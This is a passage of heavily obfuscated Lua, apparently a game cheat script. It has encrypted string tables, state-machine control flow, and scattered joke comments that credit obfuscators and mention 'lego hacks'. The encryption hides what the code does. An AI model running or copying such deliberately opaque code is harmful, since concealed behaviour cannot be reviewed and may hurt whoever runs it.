\122",2151844284372)]T=n[i("\110\112\030\111\094\174\182\029\235~\157\043\205\033\037\088",21078195260590)]Vn[69]=n[i("\192\123\209\102\109\180\225\002\108\156\165\209\071\078\076\167",32988503046146)]A=B(10778441,{})Vn[5]=n[i("\166\n\035\173\"\094\079\168\207\130~\137\052\146\052\250\233\042\014\210",18846891656336)]PR=n[i("\'\149\169\089",34825731374769)]Vn[60]=n[i("\067\208\231\244\227\019\247\117",4015916977820)]j=n[i("\030\029\060\004\102\067\029\135\215\142\213\226\199\128\087\n",2994757339877)]Vn[58]=n[i("\060\167\184\069\226\224\128\a\231\002\090\012\r\221\063\067\002\113\033\089\163\255\055\057",8002842041629)]CR=n[i("\193\086\087\215\001\107\115\087\076\065\017\064\253\"\199\249",30691699191719)]Vn[16]=n[i("\094\083\'\141\250\212\185\063",17908412662054)]bR=n[i("\175\197\016\116\077\235\043\138\036\145\110\156",900896883527)]Vn[9]=n[i("\182\224\195\091\055\250\000\250\160\174\066\167\041\043\002\212\115\133\189\051\b\066\121\222",9686520603453)]K=A W=n[i("\001\n\098\117\058\062\171\178\091\253\074\249",13673445667262)]eR=n[i("\210\207\149\146\163\120~\200\020\"\048\204\209\043\246\145",6254737004225)]Vn[82]=n[i("\114\243\095\232\071\044\112\036\041\b\142\088\068\038\116\v",27235218776852)]Vn[55]=n[i("\218\089\082\058\118\093\228\105\b\245\105\239\098\171\173\216\094\082\252\025\182\200\028\225\047\031\117\077\017\030\159\231\026\168\155\119\n\037\139\081\123\059\153\090\083\145\093\224\248\167\219\048\044\180\019\238",19025138238774)]o=n[i("\160\231\247\108\022\240\229\246\a\195\194\231",25824278961650)]Vn[37]=n[i("\209\169\207\207\118\216\087\072\054\181\105\031\063\060\014\110",24476691847435)]Vn[22]=n[i("\076\129\248\194\082\171\143\093",21930772287432)]sR=n[i("\026\243\063\196\166\227\211\181\023\153\058\195",20795792542631)]Vn[27]=n[i("\062\115\202\041\218\096\120\074\014\"\242\066\196\004\041\163\161\171\232\133",12977639730998)]Vn[63]=n[i("\136\114\r\020\207\189\038\055\245\027\093\018",24388642330809)]Vn[68]=n[i("\035\231\214\129\115\098\222\004\072\211\086\063\166\052\249\061\247\251\075~",5101503091343)]Vn[25]=n[i("\106\016\233\053\201\055\031\147",28892052973851)]Vn[3]=n[i("\040\245\063\062\114\174\205\052\244\189\104\023",9818594878392)]Z=n[i("\054\213\066\124\059\158\091\131",7095502510544)]oR=n[i("\145\069\153\100\137\154\000\070\235\012\197\243\018\170\114\249\044\235\022\189\225\109 \152\225\209\182\202",27397358740395)]LR=n[i("\189\057\141\164\142\037\195\254\084\140\158\098\240\226\096\249",28552740202463)]Vn[17]=n[i("\048\054\113\051\089\125-\072\192\116\239\136\196\249\057\056\017\187\t\"\049\199\079~",18527980602215)]Vn[11]=n[i("\053\216\224\242\101\127\222\185\138\250\254\165",4425025097753)]w=n[i("\001\233\087\066\127\220\238\249\180\075\203\214",1399128294679)]pR=n[i("\220\127\183\088",29156201523729)]f=n[i("\212\154\142\072\061\063\113\231\167\052\054\049\048\207\212\061\016\048\070\122\097\031\174\036",13111861555123)]Vn[66]=n[i("\040\208\046\149\028\201\162\173\116\047\004\114\033\140\242\029\244\203\066\100\177\107\038\225\254\083\036\175",35131757133775)]V=n[i("\253\226\161\200\253\158\146\109\156\113\168\097",30901085237354)]y=n[i("\150\006\232\144\176\228\198\253\228\014\019\219\025\121\042~\103\150\233\'",30780822482938)]YR=n[i("\077\214\143\107\053\068\005\113",26546929262739)]Vn[80]=n[i("\049\006\209\002\110\089\059\109",23805582726810)]qn=n[i("\082\188\061\166\195\063\016\149\223\201\003\240\182\120\075\179\021\052\152 \060\107\029\232\179\a\'\136\004\200\169\167\019\106\056\074\099\249\130\235\170\140\247\016\191\r\085\135\250\184\253\130\012\035\192\092\243\113\074\073\241\072\125\143\197\255\110\245\208\197\149\157\134\127\'\094",7693594958845)]Vn[4]=n[i("\065\037\216\131\193\147\060\091",6766927485086)]Vn[14]=n[i("\065\060\159\179\193\060\180\103",13964438581965)]Vn[39]=n[i("\014\217\029\223\041\178\173\002",4605419229377)]HR=n[i("\078\143\128\097\047\241\172\022\222\178\210\095\046\235\043\220",7507831954256)]Ln=n[i("\t\193\240\155\093\b\063\043\131\079\195\048\072\210\204\166\084-\077\238\022\000\050\060\145\028\242\183",22145527206032)]J=n[i("\105\085\t\228\179\098\133\147\036\103\170\205",11942521023346)]an=n[i("\019\156\162\244\063\177\133~\204\096\186\057\106\059\083\212",34801034559130)]Vn[70]=n[i("\159\023\022\247",8429130555050)]wR=n[i("\207\223\140\164\180\173\139\037",27225554805515)]FR=n[i("\125\019\204\067\131\024\241\085",5677046273191)]Vn[42]=n[i("\199\089\224\174\019\025\014\054\198\n\169\v",34710837493318)]Vn[51]=n[i("\083\100\066\125\157\236\221\249\248\108\004\103\206\'\230\255\254\044\149\087\113\n\080~",6047498507776)]NR=n[i("\251\110\005\035\181\178\b\112\074\061\079\189\025\146\054\226\135\137\a\141",9138895561023)]Vn[65]=n[i("\153\168\028\102\214\021\095\022",24098723190699)]hR=n[i("\024\001\006\044\002\170\069\237\042\230\093\223",34528295812508)]AR=n[i("\024\229\049\016\119\182\018\038\068\248\103\179\248\217\140\152\243\139\005\174\242\156\109\141\061\078\014\021\071\208\140\071\144\145\174\174\091\r\114\231\031\138\049\000\a\041\084\059\219\121\212\086\247\054\053\053\177\038\183\083\201\183\044\130",33836784974616)]XR=n[i("\070\047\004\193",5473029100521)]nR=n[i("\114\049\178\166\198\152\109\138\154\138\241\238\a\012\232\227",15417255606294)]N=n[i("\006\028\113\220\062\211\055\080",24296297715811)]vR=n[i("\220\162\253\063\070\023\075\124",1905949902575)]Q=n[i("\105\253\220\242\172\113\175\141\205\035\227\026\154\052\180\139\103\193\081\020\208\061\207\160",29453637085990)]Vn[78]=n[i("\139\230\123\130\206\166\015\079",23192457434207)]lR=n[i("\123\232\031\103",28248861992644)]Vn[67]=n[i("\062\064\021\158\148\124\041\040\158\228\025\247\170\229-\038\188\151\075\065",23733639829079)]WR=n[i("\074\035\155\065\132\109\171\026\115\067\046\252",8943468585097)]yR=n[i("\096\083\125\102\113\241\056\248\071\254\108\099",4296172146593)]Vn[7]=n[i("\241\180\157\193\062\030\166\"",21988756115454)]Vn[59]=n[i("\110\198\r\090\181\213\213\248",18112429834724)]Vn[74]=n[i("\100\005\168\130\211-\101\139\052\101\190\207",35025453449067)]g=n[i("\221\169\014\211\066\161\076\v",19962543458463)]Vn[31]=n[i("\128\043\088\176\241\055\191\017\087\123\233\000\092\203\222\241\075\037\106\214",32260483872092)]Vn[13]=n[i("\135\025\215\254\171\209\141\052",29972270214409)]b=n[i("\143\248\094\014\139\209\215\214\230\004\128\141\147\014\029\074",2063794767746)]mn=n[i("\250\047\245\075\247\183\178\240\177\253\016\227\202\138\112\133",555141464581)]Vn[50]=n[i("\113\042\036\225\075\084\052\173\246\179\029\030\144\157\017\166\069\r\193\151\146\067\057\'\254\133\033\244\143\240\218\050\042\106\051\128\024\078\197\105\204\025\164\175\115\093\035\027\005\144\027\136\195\110\064\242",2582427896165)]Nn=n[i("\t\053\151\055\221\096\133\093\058\015\004\002\181\210\223\059\053\227\230\n",22127273037951)]Vn[54]=n[i("\238\b\137\t\b\119\240\175\171\111\146\056\002\053\181\255",25759852486070)]X=n[i("\232\035\141\059\100\149\134\047",26372977778673)]Vn[76]=n[i("\250\023\048\072\042\236\022\071",10808615053138)]MR=n[i("\066\145\143\111\218\229\151\252\209\239\145\244\019\208\064\110\197\206\154\042\005\228\053\060\033\209\255\058",18664349975526)]D=n[i("\236\214\046\153\093\135\154\142\218\066\125\170\185\159\134\218",17368304041775)]U=n[i("\154\132\144\141\178\001\014\044\255\106\v\128\b\132\016\149\202\068\211\228\183\093\087\242\055\195\203\005\t\055\255\165",8436646977201)]Vn[47]=n[i("\202\207\254\250\135\170\v\171",34847206866629)]Vn[79]=n[i("\028\174\041\137\075\216\224\129\121\142\014\127\066\048\117\178\v\046\207\162\149\217\071\074\107\215\'\200",20529496443567)]s=L Vn[49]=n[i("\027\074\046\206\110\137\161 ",11737430076083)]Vn[72]=n[i("\190\174\133\105\073\246\164\117\140\118\101\244",28260673513167)]Y=n[i("\026\240\020\210\204\190\003\201",28509789218743)]mR=n[i("\088\144\228\167\237\056\195\015",11056656984121)]Vn[71]=n[i("\078\084\216\084",14344554787887)]Vn[73]=n[i("\069\208\166\135\223\242\158\204\186\r\022\224",9425593377354)]H=n[i("\117\091\240\111",31528169599666)]G=n[i("\086\240\075\118\243\083\245\220\159\167\145\140\037\149\204\089\199\074\093\043\228\105\097\109\022\109\133\245\197\049\054\130\r\108\252\054\199\218\123\179\137\136\244\198\237\v\155\228\133\133\058\143\016\080\175\069",34972838494010)]Vn[38]=n[i("",15001704838803)]M=n[i("\229\219\160\043\204\241\234\164\194\079-\169\166\049\099\123\172\092\216\076\n\087\n\069",15160623478567)]qR=n[i("\141\021\054\113\158\188\120\057\108\185\'\158\141\243\072\150\176\169\173\154\123\024\018\167\127\v\103\179\215\030\159\140\211\000\209\214\212\233\071\171\214\"\117\245\059\167\101\084\b\202\020\227",20136494942529)]Vn[44]=n[i("\088\155\n\087\157\145\225\213\079\049\092\053\177\134\t\098\041\249\140\186\135\183\139\253\113\004\255\192\220\195\001\110",104156135521)]gR=n[i("\077\002\028\n",24158854567907)]OR=n[i("\243\130\251\046~\157\178\211\229\181\222\048",20659423169320)]SR=n[i("\158\014\243\191\138\203\b\118\153\150\215\216\241\065\105\103\163\169\101\097",31515284304550)]xR=n[i("\191\112\091\179\208\147\123\065\071\253\107\101\199\203\155\b\182\012\031\151\228\195\161\148\118\234\128\101\064\018\079\111\094\050\169\204\248\152\170\035",29749998873658)]Vn[2]=n[i("\041\166\053\049\205\155\141\217",5372094288779)]rR=n[i("\110\084\094\103\002\223\253\138\088\160\005\061\154\245\068\069",32123040724188)]Vn[53]=n[i("\197\193\041\017\179\'\042\129\220\094\239\168\210\003\027\058\205\085\091\243\051\049\072\156\048\067\159\204\v \035\124\255\r\109\207\245\r\198\105\125\225\146\103\146\028\016\159\027\038\091\181\188\201\121\124\111\242\172\151\187\083\058\129\077\200\046\171\161\118\147\177\100\251\155\000\119\215\068\059\209\212\041\231\213\216\241\002\228\103\084\208\n\062\019\094\128\005\195\130\118\141\238\107\033\212\017\065\r\094\140\003\054\230\122\147\137\238\200\072\209\n\177\191\051\213\082\177\175\251\184\095\042\058\025\062\119\227\136\087\026\208\237\107\085\240\171\175\137\192\254\122\078\037\079\107\191\198\093\080\238\243\182\071",22207806132426)]tn=n[i("\050\033\065\v\204\035\120\142\176\223\161\a\220\061\000\177\194\109\166\'\058\r\128\218\248\120\056\199\157\088\026\180\249\183\077\171\199\224\240\002\113\068\232\068\177\094\069\113\070\143\198\166\162\153\154\130\106\174\230\224\240\214\211\194\071\047\208\172\196\110\127\082\123\012\100\052 \031\084\190\085\135\224\255\233\093\162\191\072\113\088\255\149\099\221\082",29774695689297)]I=n[i("\236\177\138\088\055\255-\217\021\242\149\058\199\085\254\184\246\215\234\153\020\152\109\052\238\078-\058",17304951340788)]E=n[i("\216\189\237\132\017\198\140\005\053\248\235\079\103\035\255\215",34592722288088)]Vn[45]=n[i("\193\195\175\185\021\078\225\016\059\131\240\065\154\101\238\129\203\173\199\205\122\037\029\074\254\228\071\080",28994061560186)]Vn[12]=n[i("\154\003\113\254\250\219\148\111\105\140\101\076",2089565357978)]uR=n[i("\067\077\198\203\191\114\239\055\112\254\155\201",16583374814292)]Vn[18]=n[i("\175\238\215\068\205\097\147\136\139\245\209\069\191\002\016\087",7218986588739)]UR=n[i("\254\125\217\249\164\154\081\077\031\193\r\132~\242\178\214\246\012\046\027\205\255\078\085",21938288709583)]d=n[i("\183\143\191\143\160\123\160\127\099\002\145\242\181\027\038\073",14861040367120)]sn=n[i("\097\072\074\124\118\234\061\119\049\184\096\168",21932919836618)]Vn[24]=n[i("\231\197\003\170\247\253\212\254",15831732599192)]tR=n[i("\103\094\128\053\213\218\207\200",18123167580654)]Vn[57]=n[i("\037\068\224\057\037\255\177\194",24083690346397)]Vn[61]=n[i("\245\175\230\236\124\188\030\114\165\193\195\048\192\073\006\230\049\220\113\t\128\'\040\053\095\086\114\t\173\040\038\046\206\051\117\055\052\248\047\223\040\r\075\075\235\122\065\178\162\062\156\062\161\249\244\229\238\188\228\068\187\088\012\093\141\147\163\103\149\069\077\004\000\188\097\004\055-\203\140\057\162\022\025\r\"\035\153\005\090\105\119\031\194\159\018\096\188\224\089\192\089\161\197\235\145\161\086\163\098\132\092\183\095\048\091\086\112\240\198\003\215\203\230\n\242\150\143\b\053\077\159\001\057\068\241\159\174\242\074\113\175\028\216\036\023\187\214\143\099\209\180\102\r\197\000\209\123\252\100\026\027\241\057",20524127570602)]Vn[30]=n[i("\084\188\241\202\156\214\159\175\177\128\083\076",23269769204903)]Vn[8]=n[i("\203\121\053\154\151\176\247\176\251\239\135\138\148\254-\226\056\217\v\115\078\t\153\250\077\062\078\250\243\017\002\048\248\r\015\058\099\107\146\208\002\139\159\228\190\086\082\152\140\075\015\196\072\218\093\028\110\038\166\223\163\087\088\216\147\014\210\162\208\023\028\152\082\046\a\096\062\187-\173\206\084\071\188\017\187\020\151\003\247\237\113\144\208\243\242\000\128\090\156\140\128\157\087\134\246\040\065\169\v\237\096\187\252\041\b\112\057\038\125\076\003\161\064\b\189\086\078\122\048\097\186\171\112\049\215\105\151\v\175\091\131\190\142\082 \199\023\031\046\252\223\243\145\230\164\238\218\189\096\207\215\035\179",21700984524530)]Cn=n[i("\242\212 \124\155\230\226~\230\062\149\149",5010232250938)]h=n[i("\151\080\094\176\078\043\015\124\088\185\117\232",298509336854)]Fn=n[i("\079\044\092\144\080\228\199\169\028\115\218\146\117\119\231\a\004\211\023\041\062\129\095\140",25526843399389)]Vn[46]=n[i("\102\127\037\t\173\245\002\139\059\049\192\067\040\135\231\242\047\068\048\185\125\025\255\156",6914034604327)]R=n[i("\133\199\249\100\163\223\146\023\152\012\121\014\224\147\202\037\023\085\248\027\117\253\182\201\067\160\184\246\191\'\217\254\020\012\v\004\189\115\071\036\245\049\233\124\220\250\094\031\154\041\177\100\026\064\144\167\047\161\255\237\224\130\040\224\240\191~\138",25108071308119)]Vn[6]=n[i("\103\079\072\203\206\215\246\148",16989261610446)]Vn[15]=n[i("\223\035\051\213",13407149568198)]fR=n[i("\107\130\006\132\241\120\244\095\208\216\163\078\030\118\239\018\107\243\161\204\172\150\086\238",2329017092217)]Vn[48]=n[i("\014\228\114\109\255\046\206\019\204\225\180\190",13328764022909)]An=n[i("\152\005\033\012\120\056\119\136\204\250\057\106",11072763603016)]jR=n[i("\056\112\117\063\216\185\196\164\145\222\068\059\224\075\173\140\152\170\069\064",15891863976400)]Jn=n[i("\156\220\022\130\216\074\058\222\184\128\214\231\053\241 \092",322132377900)]Vn[34]=n[i("\086\017\247\066",18471070548786)]Vn[81]=n[i("\v\230\147\210\053\223\243\160\203\119\054\'",22270085058820)]DR=n[i("\021\019\064\153",6410434320210)]r=n[i("\046\101\250\208\049\066\090\244\041\089\199\171\054\167\158\162\215\061\129\230\243\027\238\"\252\144\065\151\176\031\195\208\209\069\227\"\186\251\153\025\124\067\100\030\097\238\157\082\112\189\067\200\250\109\029\197",31557161513677)]Vn[75]=n[i("\248\250\225\033\141\235\225\102\187\252\146\164\247\093\240\168",7727955745821)]dR=n[i("\020\184\203\205",24217912170522)]TR=n[i("\089\080\231\059\196\190\089-",33755178105548)]Vn[56]=n[i("\183\229\171\223\217\250\225\067\148\n\156\104",22927235109736)]Vn[52]=n[i("\252\157\102\249\210\092\041\a\056\017\149\219\069\237\132\t\254\056\092\'\134\105\088\086\064\155\024\056\026\246\190\071\163\167\006\194\093\012\250\214\205\237\063\097\128\164\021\199\140\220\226\a\157\222\148\234\175\162\114\005\181\251\233\228\003\030\023\049\083\099\051\252\070\208\102\066\015\041\139\107\002\158\236\157",33375061899626)]Vn[40]=n[i("\215-\204\212\029\195\233\211\148\t\027\176\171\151\107\248",26961406255637)]QR=n[i("\232\052\b\021\115\135\037\t\158\218\127\015\209\103\132\117\240\105\022\134\146\205\194\214",6993493924209)]zR=n[i("\002\106\030\235\166\174\017\162\254\146\241\057\235\174\058\001",25009284045563)]k=n[i("\132\197\a\148\130\175\230\061\108\215\022\211\135\160\054\028\246\070\134\082\071\202\064\040",29807982701680)]ER=n[i(" \052\223\000\098\051\173\014\218\097\068\012\026\067\044\239\175\138\038\164\218\115\052\106\253\172\067\036\048\224\000\175\201\082\048\137\208\205\100\047\014\065\198\117\232\116\049\014\082\099\226\166\110\079\106\239\196\093\204\014\230\143\035\109\249\209\227\041\000\092\143\145\081\180\219\116",21719238692611)]Vn[21]=n[i("\241\016\092\240\035\226\154\251\076\251\202\161\151\228\001\133",23882894497506)]Vn[32]=n[i("\128\201\b\111\138\227\164\234",5269011927851)]aR=n[i("\112\153\251\197\121\246\180\242",33691825404561)]zn=n[i("\149\221\105\121\000\223\100\113\123\016\163\227\081\014\118\141",28533412259789)]VR=n[i("\218\120\123\110\040\053\r\191-\167\158\249\098\171\095\157",3639022095677)]KR=n[i("\220\148\216\081\065\217\215\002\067\164\247\191\097\228\061\128\193\123\254\018\106\031\003\241",4181278265142)]JR=n[i("\062\180\093\023\210\066\086\056\122\052\169\157",19072384320866)]Vn[1]=n[i("\014\090\249\169\212\156\116\094\219\152\159\049\014\014\246\229\090\070\232\172\063\074\099\219\048\127\080\101",32373230204357)]BR=n[i("\206-\215\253\107\058\213\244\084\r\092\028\081\063\173\087\035\253\122\077\115\063\177\060\176\223\191\186\050\174\236\214\141\161\222\194\174\089\098\163\160\059\047\181\165\222\151\206\107\058\167\187\226\142\158\204\178\051\131\162\056\095\210\198\026\141\019\125\166\172\195\203\082\043\149\253\241\058\109\238\096\099\157\251\147\150\163\159\136\188\174\044\230\242\230\179\109\049\107\079\050\115\102\233\169\165 \050",6139843122774)]Vn[64]=n[i("\073\178\243\238\089\178 \037\155\222\019\202",26433109155881)]v=n[i("\v\088\141\063\149\224\223\244\214\089\185\050",34648558566924)]IR=n[i("\078\195\185\082\219\234\132\170\059\211\134\096\222\061\107\048",33121651095678)]A={N,x;J;V;f;y,U,o;k,M,X;b;h;Q,r,D,G;R;W,Z,j,S,v;H;I;d;Y;O,g,w,E;T,iR;nR,FR;AR,qR,LR;zR,tR;aR,NR,CR,sR,mR;KR,JR;VR;PR,uR;BR;cR,pR,eR,lR,xR;fR,yR,kR,MR,oR;UR,XR,bR,hR,QR,rR,DR,GR;RR,WR,ZR;jR;SR,vR,HR,IR,dR;YR;OR,gR;wR;ER,TR;nn;Fn;An;qn,Ln;zn,tn;an,Nn;Cn;sn;mn;Kn,Jn,Vn[1];Vn[2];Vn[3],Vn[4],Vn[5],Vn[6],Vn[7],Vn[8],Vn[9];Vn[10];Vn[11],Vn[12];Vn[13];Vn[14];Vn[15];Vn[16];Vn[17],Vn[18],Vn[19],Vn[20],Vn[21];Vn[22];Vn[23],Vn[24],Vn[25],Vn[26];Vn[27],Vn[28];Vn[29],Vn[30],Vn[31],Vn[32];Vn[33];Vn[34],Vn[35],Vn[36];Vn[37],Vn[38];Vn[39];Vn[40],Vn[41];Vn[42],Vn[43],Vn[44];Vn[45],Vn[46];Vn[47],Vn[48],Vn[49];Vn[50];Vn[51],Vn[52],Vn[53];Vn[54];Vn[55];Vn[56];Vn[57];Vn[58];Vn[59],Vn[60];Vn[61],Vn[62],Vn[63];Vn[64];Vn[65];Vn[66],Vn[67];Vn[68];Vn[69];Vn[70];Vn[71],Vn[72];Vn[73],Vn[74],Vn[75],Vn[76],Vn[77],Vn[78];Vn[79],Vn[80];Vn[81],Vn[82];Vn[83];Vn[84]}x=m()k=182 J=m()N=n[i("\232\254\233\248\078\128",33609144760900)]C[x]=A X=182 A=B(2715219,{x})M=21 o=1 U={o,k}k=1 o={k,M}C[J]=A A=F[N]M=22 k={M;X}y={U,o;k}U={A(y)}A=7233245 f=U[3]V=U[2]N=U[1]y=N--[[the person who made this script ip grabbed a gorilla]] end--[[rubi was here]] else if A<12980755 then J=C[z[1]]V=C[z[2]]y=23436 f=V(y)x=J[f]J=C[z[2]]f=23360 V=J(f)K=x[V]V=23364 x=C[z[2]]J=x(V)N=K[J]J=23418 K=C[z[2]]x=K(J)A=N==x A=A and 9396511 or 1867321--[[Override certified boronide fork]] else CR=n[i("\153\124\173\163\216\235\251\017\177\142\149\224\110\234\041-\057\118\106\249\v",6961280686419)]CR=h[CR]aR=A sR=C[J]KR=23501 mR={sR(KR)}CR=CR(h,q(mR))sR=C[J]KR=23468 mR=sR(KR)KR=23481 NR=CR[mR]sR=C[J]mR={sR(KR)}CR=n[i("\221\018\236\021",10981492762611)]CR=NR[CR]CR=CR(NR,q(mR))A=CR and 1064992 or 12701572 tR=CR--[[hey psst you the wrapper function is right there]] end--[[https://soundcloud.com/shieldenergy]] end--[[hey psst you the wrapper function is right there]] else if A<13148232 then if A<13041442 then A=B(5506216,{o})j={A()}A=F[n[i("\094\153\139\104\192\176\180\059\004\021\105\014",30203131751904)]]N={q(j)}--[[free source code: dariandev.com/discord]]else sR=n[i("\167\230\159\137",28347649255200)]nR=nil CR=nil mR=.1 LR=F[sR]sR=LR(mR)zR=nil iR=nil NR=nil A=186885 tR=nil aR=nil--[[rubi was here]] end--[[whats a jmesðŸ¤”]] else r=G A=R A=14425529--[[hey psst you the wrapper function is right there]] end--[[Obfuscated with luaobfuscator.com]] end--[[Mitochondria is the powerhouse of the cell]] end--[[(xA, qt, Sz) ha i broke ur regex]] end--[[hey psst you the wrapper function is right there]] end--[[who the fuck uses mee6]] else if A<14628092 then if A<13954288 then if A<13527676 then if A<13372751 then if A<13349824 then if A<13317442 then A=zR iR=LR A=LR and 4825747 or 14333366--[[(xA, qt, Sz) ha i broke ur regex]] else A=true A=A and 13583263 or 13023118--[[https://soundcloud.com/shieldenergy]] end--[[DevFuscator V6 realðŸ¤¯ðŸ˜²]] else if A<13354669 then Q=A G=n[i("\193\180\054\107",33253725370617)]D=F[G]Z=23490 G=C[J]R=G(Z)r=D[R]A=r and 2238020 or 8605959 h=r--[[mee6 what are you doing to my wife]] else N={}A=F[n[i("\196\128\030\169\158\055\022\015\131\136\042\025\227",30397484953237)]]--[[free source code: dariandev.com/discord]]end--[[Evon is not a bitcoin miner real]] end--[[loadstring = print (sukssesful deobfuskation)ðŸ˜ŽðŸ’…]] else if A<13426458 then if A<13405261 then X=23379 K=L[2]N=n[i("\017\160\218\068",26521158672507)]h=23365 f=23479 x={a(3,q(L))}s=L[1]A=F[N]J=C[z[1]]W=23466 V={J(f)}N=n[i("-\118\212\143\237\187\202\074\070\137",23649885410825)]N=A[N]k=23379 N=N(A,q(V))f=23375 r=23426 y=23390 J=N N=C[z[1]]V=N(f)N=C[z[1]]f=N(y)y=23499 N=C[z[1]]A={[V]=f}f=N(y)U=C[z[1]]o=U(k)k=C[z[1]]G=23345 M=k(X)V=A U=K[M]k=C[z[1]]X=23365 M=k(X)X=C[z[1]]b=X(h)h=23426 k=K[b]X=C[z[1]]b=X(h)h=C[z[1]]Q=h(r)r=23345 X=K[Q]h=C[z[1]]Q=h(r)r=C[z[1]]D=r(G)h=K[D]r=C[z[1]]G=23338 D=r(G)G=C[z[1]]R=G(W)Z=C[z[1]]S=23338 j=Z(S)W=K[j]S=23466 Z=C[z[1]]j=Z(S)G=W[j]r={[R]=G}y={[o]=U,[M]=k;[b]=X,[Q]=h,[D]=r}N={y}A={[f]=N}f=A A=n[i("\076\181\252\087\219\096\088\121\245\090",2554509756747)]A=J[A]A=A(J,f)y=A N=n[i("\096\235\226\128\079\175\191",5141232751284)]K=nil X=23456 M=23476 A=F[N]o=C[z[1]]k=o(M)f=nil h=23357 b=23470 o=C[z[1]]Q=23475 M=o(X)o=C[z[1]]X=o(b)o=C[z[1]]b=o(h)o=C[z[1]]h=o(Q)U={[k]=s;[M]=X;[b]=V;[h]=y}N=A(U)s=nil M=23446 U=N N=n[i("\051\002\215\005\127",13224607887388)]J=nil A=F[N]o=C[z[1]]y=nil k={o(M)}N=A(q(k))V=nil A=F[n[i("\221\109\048\015\148\105\245\074\012-\196\020\147",389780177259)]]N={}U=nil--[[Mitochondria is the powerhouse of the cell]] else b=nil A=C[z[2]]A[M]=b A=14607294--[[devfuscator free no virus 2021]] end--[[Override certified boronide fork]] else if A<13437205 then J=23416 K=C[z[1]]N=16292850 x=K(J)K=374284 s=x^K A=N-s N=C[z[1]]s=A x=23441 K=N(x)A=K/s N={A}A=F[n[i("\048\063\150\136\115\041\043\102\076\180\r\212\056",21328384740759)]]--[[free source code: dariandev.com/discord]]else R=A iR=n[i("\118\025\146\136",13940815540919)]LR=23424 T=F[iR]iR=C[J]nR=iR(LR)w=T[nR]T=C[J]nR=23392 iR=T(nR)g=w[iR]iR=23334 w=C[J]T=w(iR)Z=g[T]A=Z and 12666755 or 12667267 G=Z--[[the person who made this script ip grabbed a gorilla]] end--[[https://soundcloud.com/shieldenergy]] end--[[Please do not the skid. ]] end--[[Please do not the skid. ]] else if A<13636415 then if A<13582853 then if A<13552449 then A=T A=Z and 6994133 or 2829398--[[whats a jmesðŸ¤”]] else tR=2 zR=nR[tR]tR=C[iR]A=12248950 LR=zR==tR AR=LR--[[what am i doing with my life? making lego hacks]] end--[[real moonsec v4!11ðŸ˜²ðŸ¤¯]] else if A<13584955 then A=3339366--[[https://soundcloud.com/shieldenergy]] else nR=A NR=23448 aR=23468 zR=C[J]tR=zR(aR)zR=n[i("\163\190\162\212",19961469683870)]Z=w LR=T[tR]tR=C[J]aR={tR(NR)}zR=LR[zR]zR=zR(LR,q(aR))A=zR and 16009193 or 11457886 iR=zR--[[DevFuscator V6 realðŸ¤¯ðŸ˜²]] end--[[whats a jmesðŸ¤”]] end--[[https://soundcloud.com/shieldenergy]] else if A<13876905 then if A<13803349 then g=n[i("\195",4536697655425)]O=H==g A=O and 8620295 or 2268229--[[DevFuscator V6 realðŸ¤¯ðŸ˜²]] else V=23388 N=C[s]x=C[z[1]]J=x(V)A=N[J]A=A and 13958058 or 15817187--[[devfuscator free no virus 2021]] end--[[the person who made this script ip grabbed a gorilla]] else if A<13941616 then U=n[i("-\127\155\209\112",21918960766909)]o=p(6380227,{z[5]})N=n[i("\237\148\235\212\n\135\140\193",31420792140366)]A=F[N]J=n[i("\024\133\070\006\252\171\104\210",16221512776451)]s=C[z[4]]x=F[J]y=F[U]U={y(o)}y=2 f={q(U)}V=f[y]f=23445 J=x(V)x=C[z[5]]V={x(f)}K=s(J,q(V))s={K()}N=A(q(s))s=N K=C[z[6]]N=K A=K and 16456695 or 15260626--[[the person who made this script ip grabbed a gorilla]] else AR=C[V]FR=AR A=AR and 9731369 or 10018610--[[Please do not the skid. ]] end--[[im telling my mommy ðŸ˜¤]] end--[[(xA, qt, Sz) ha i broke ur regex]] end--[[DevFuscator V6 realðŸ¤¯ðŸ˜²]] end--[[im telling my mommy ðŸ˜¤]] else if A<14305391 then if A<14213834 then if A<14010907 then if A<13961660 then V=C[s]U=23436 f=C[z[1]]y=f(U)J=V[y]y=23360 V=C[z[1]]f=V(y)x=J[f]f=23364 J=C[z[1]]V=J(f)N=x[V]x=C[z[1]]V=23418 J=x(V)A=N==J A=A and 5822642 or 9387807--[[https://soundcloud.com/shieldenergy]] else sR=n[i("\112\114\026\214\092\040\168\053\246\196\153\221\239\130",7723660647449)]kR=23424 tR=n[i("\015\255\063\016\178",9314994594275)]xR=n[i("\190\071\179\146",19058425251157)]Z=nR zR=F[tR]CR=F[sR]lR=F[xR]xR=n[i("\138\102\174\111\236\152\017\184\249\184",29898179767492)]fR=C[J]yR={fR(kR)}xR=lR[xR]xR=xR(lR,q(yR))lR=C[J]yR=23392 fR=lR(yR)eR=xR[fR]fR=23409 lR=C[J]xR=lR(fR)pR=eR[xR]eR=C[J]xR=23502 lR=eR(xR)cR=pR[lR]pR=C[J]lR=23463 eR=pR(lR)BR=cR[eR]cR=C[J]eR=23408 pR=cR(eR)uR=BR[pR]pR=23367 BR=C[J]cR=BR(pR)PR=uR[cR]uR=C[J]cR=23403 BR=uR(cR)VR=PR[BR]BR=23469 PR=C[J]uR=PR(BR)JR=VR[uR]VR=C[J]uR=23434 PR=VR(uR)KR=JR[PR]mR=KR[LR]sR={CR(mR)}A=4624013 CR={zR(q(sR))}tR=CR[1]aR=CR[2]NR=CR[3]--[[the person who made this script ip grabbed a gorilla]]end--[[DevFuscator V6 realðŸ¤¯ðŸ˜²]] else if A<14125346 then A=T A=Z and 9173272 or 15868389--[[rubi was here]] else A=zR iR=LR A=11457886--[[free source code: dariandev.com/discord]] end--[[rubi was here]] end--[[hey psst you the wrapper function is right there]] else if A<14271731 then if A<14259030 then tR=n[i("\239 \035\v",30950478868632)]zR=F[tR]aR=C[J]CR=23439 A=7464676 NR={aR(CR)}tR=n[i("\021\071\117\240\114\078\195\179\208\142",11108198164585)]tR=zR[tR]tR=tR(zR,q(NR))zR=C[J]NR=23397 aR=zR(NR)LR=tR[aR]zR=C[J]aR=23417 tR=zR(aR)nR=LR[tR]LR=C[J]tR=23361 zR=LR(tR)iR=nR==zR Z=iR--[[loadstring = print (sukssesful deobfuskation)ðŸ˜ŽðŸ’…]] else A=F[n[i("\094\243\111\206\116\102\234\026\137\189\154\014\248",26933488116219)]]N={}--[[(xA, qt, Sz) ha i broke ur regex]]end--[[loadstring = print (sukssesful deobfuskation)ðŸ˜ŽðŸ’…]] else if A<14276374 then v=true A=v and 9255194 or 1536--[[Mitochondria is the powerhouse of the cell]] else A=T A=Z and 4197504 or 4331140--[[who the fuck uses mee6]] 